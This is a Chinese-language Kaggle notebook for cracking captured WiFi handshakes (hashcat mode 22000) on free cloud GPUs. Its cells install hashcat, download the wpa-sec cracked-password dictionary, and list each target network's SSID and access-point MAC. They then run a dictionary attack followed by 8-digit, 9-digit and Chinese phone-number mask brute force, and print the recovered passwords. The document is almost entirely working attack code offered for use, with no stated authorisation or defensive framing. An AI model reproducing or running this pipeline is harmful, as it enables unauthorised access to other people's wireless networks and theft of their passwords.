# WiFi握手包GPU破解 - Kaggle免费GPU加速

**用途**: 将捕获的WiFi握手包(.22000文件)上传到Kaggle，利用免费GPU(T4/P100)跑hashcat离线破解

**使用方法**:
1. 将.22000文件上传到Kaggle Dataset（创建一个Dataset命名为wifi-handshakes）
2. 在本Notebook中添加该Dataset
3. 运行全部Cell，自动安装hashcat并依次破解所有握手包

**攻击策略**: 字典攻击(wpa-sec) → 8位纯数字 → 9位纯数字 → 手机号模式

| GPU | WPA速度 | 8位数字耗时 |
|-----|---------|----------|
| Kaggle T4 | ~80K H/s | ~20分钟 |
| Kaggle P100 | ~120K H/s | ~14分钟 |
| Mac M1 | ~52K H/s | ~32分钟 |

## 1. 环境检测与hashcat安装

In [ ]:
# ============================================================================
# 环境检测：GPU信息、hashcat安装
# ============================================================================
import os, subprocess, glob, time, sys

# 检测GPU
print('=== GPU信息 ===')
!nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null || echo 'GPU不可用，请在Kaggle Settings中开启GPU加速器'
print()

# 安装hashcat
print('=== 安装hashcat ===')
!apt-get update -qq > /dev/null 2>&1 && apt-get install -y -qq hashcat > /dev/null 2>&1
!hashcat --version
print()

# hashcat GPU基准测试
print('=== WPA破解速度基准测试 ===')
!timeout 120 hashcat -b -m 22000 2>/dev/null | grep -E 'Speed|Hash.Mode' || echo '基准测试完成'
print('\n环境准备完成!')

## 2. 下载wpa-sec全球已破解密码字典

In [ ]:
# ============================================================================
# 下载wpa-sec全球社区破解的WiFi密码字典（按频率排序，约75万条）
# ============================================================================
DICT_FILE = '/kaggle/working/wpa-sec-cracked.txt'

if not os.path.exists(DICT_FILE):
    print('下载wpa-sec全球已破解密码字典...')
    !wget -q 'https://wpa-sec.stanev.org/dict/cracked.txt.gz' -O /tmp/cracked.txt.gz
    !gunzip -c /tmp/cracked.txt.gz > {DICT_FILE}
    !wc -l {DICT_FILE}
    print('字典下载完成!')
else:
    print(f'字典已存在: {DICT_FILE}')
    !wc -l {DICT_FILE}

## 3. 加载握手包文件

**方式A**: 将.22000文件上传为Kaggle Dataset，路径自动检测

**方式B**: 直接在下方粘贴hashline内容

In [ ]:
# ============================================================================
# 加载所有.22000握手包文件
# ============================================================================

# ── 方式B: 直接粘贴hashline（取消注释并填入你的hashline） ──
MANUAL_HASHLINES = [
    # 在这里粘贴你的hashline，每行一个，例如：
    # 'WPA*02*69e21d65...*a4ba70041a7e*...',
]

# ── 方式A: 从Kaggle Dataset自动扫描.22000文件 ──
hash_files = []
for search_dir in ['/kaggle/input', '/kaggle/working']:
    hash_files.extend(glob.glob(f'{search_dir}/**/*.22000', recursive=True))
    hash_files.extend(glob.glob(f'{search_dir}/**/*.hc22000', recursive=True))

# 如果有手动粘贴的hashline，写入临时文件
if MANUAL_HASHLINES:
    manual_file = '/kaggle/working/manual_hashes.22000'
    with open(manual_file, 'w') as f:
        for line in MANUAL_HASHLINES:
            if line.strip():
                f.write(line.strip() + '\n')
    hash_files.append(manual_file)
    print(f'手动添加 {len(MANUAL_HASHLINES)} 条hashline')

# 合并所有哈希到一个文件
ALL_HASHES = '/kaggle/working/all_hashes.22000'
total_hashes = 0
with open(ALL_HASHES, 'w') as out:
    for hf in hash_files:
        with open(hf) as f:
            for line in f:
                line = line.strip()
                if line.startswith('WPA*'):
                    out.write(line + '\n')
                    total_hashes += 1

# 解析并显示目标信息
print(f'\n=== 共加载 {total_hashes} 个WiFi握手包哈希 ===')
with open(ALL_HASHES) as f:
    for i, line in enumerate(f):
        parts = line.strip().split('*')
        if len(parts) >= 6:
            htype = 'PMKID' if parts[1] == '01' else 'EAPoL握手'
            try:
                ssid = bytes.fromhex(parts[5]).decode('utf-8', errors='replace')
            except:
                ssid = parts[5]
            mac_ap = ':'.join(parts[3][i:i+2] for i in range(0, 12, 2))
            print(f'  [{i+1}] {ssid} ({mac_ap}) [{htype}]')

if total_hashes == 0:
    print('\n[!] 未找到握手包！请上传.22000文件到Dataset或在MANUAL_HASHLINES中粘贴hashline')

## 4. hashcat GPU破解（字典攻击 + 掩码暴力）

In [ ]:
# ============================================================================
# hashcat GPU破解：字典攻击 → 掩码暴力
# ============================================================================

OUTFILE = '/kaggle/working/cracked_passwords.txt'
POTFILE = '/kaggle/working/hashcat.potfile'

# 清理旧结果
for f in [OUTFILE, POTFILE]:
    if os.path.exists(f):
        os.remove(f)

def run_hashcat(attack_name, extra_args):
    """运行hashcat并返回是否全部破解"""
    print(f'\n{"="*60}')
    print(f'  {attack_name}')
    print(f'{"="*60}')
    cmd = [
        'hashcat', '-m', '22000',
        ALL_HASHES,
        '--potfile-path', POTFILE,
        '--outfile', OUTFILE,
        '--outfile-format=2',  # 仅输出密码
        '-w', '3',  # 高工作负载
        '-O',       # 优化内核
    ] + extra_args
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=7200)
    output = result.stdout + result.stderr
    
    # 提取速度和状态
    for line in output.split('\n'):
        if 'Speed' in line or 'Status' in line or 'Recovered' in line or 'Progress' in line:
            print(f'  {line.strip()}')
    
    # 检查是否已全部破解
    if 'Cracked' in output:
        print(f'  >>> 发现密码! <<<')
        return True
    if 'All hashes found' in output:
        return True
    return False

# ── 攻击1: wpa-sec全球字典（75万条，约15秒） ──
if os.path.exists(DICT_FILE):
    done = run_hashcat(
        '攻击1: wpa-sec全球已破解密码字典（~75万条）',
        ['-a', '0', DICT_FILE]
    )
    if done:
        print('\n全部破解完成!')

# ── 攻击2: 8位纯数字掩码（1亿组合，T4约20分钟） ──
if not done:
    done = run_hashcat(
        '攻击2: 8位纯数字掩码（00000000-99999999）',
        ['-a', '3', '?d?d?d?d?d?d?d?d']
    )

# ── 攻击3: 9位纯数字掩码（10亿组合，T4约3.5小时） ──
if not done:
    done = run_hashcat(
        '攻击3: 9位纯数字掩码（000000000-999999999）',
        ['-a', '3', '?d?d?d?d?d?d?d?d?d']
    )

# ── 攻击4: 手机号模式 1+10位数字 ──
if not done:
    done = run_hashcat(
        '攻击4: 手机号模式（1开头+10位数字）',
        ['-a', '3', '1?d?d?d?d?d?d?d?d?d?d']
    )

print(f'\n{"="*60}')
print('  所有攻击完成')
print(f'{"="*60}')

## 5. 查看破解结果

In [ ]:
# ============================================================================
# 显示破解结果
# ============================================================================

print('=== 破解结果 ===')
print()

# 从potfile读取结果（格式：hash:password）
cracked = []
if os.path.exists(POTFILE):
    with open(POTFILE) as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                parts = line.rsplit(':', 1)
                if len(parts) == 2:
                    hash_part = parts[0]
                    password = parts[1]
                    # 从hash中提取SSID
                    hp = hash_part.split('*')
                    ssid = ''
                    if len(hp) >= 6:
                        try:
                            ssid = bytes.fromhex(hp[5]).decode('utf-8', errors='replace')
                        except:
                            ssid = hp[5]
                    cracked.append({'ssid': ssid, 'password': password})

if cracked:
    print(f'成功破解 {len(cracked)} 个WiFi密码:\n')
    for i, c in enumerate(cracked):
        print(f'  [{i+1}] SSID: {c["ssid"]}')
        print(f'       密码: {c["password"]}')
        print()
else:
    print('未破解任何密码。')
    print('可能原因：')
    print('  - 密码不在字典中且不是纯数字')
    print('  - 密码长度超过11位')
    print('  - 握手包数据不完整')
    print()
    print('建议：')
    print('  - 添加更大的字典（如rockyou.txt）')
    print('  - 尝试更多掩码模式（字母+数字组合）')

# 也用--show命令查看
print('\n=== hashcat --show ===')
!hashcat -m 22000 {ALL_HASHES} --potfile-path {POTFILE} --show 2>/dev/null || echo '无结果'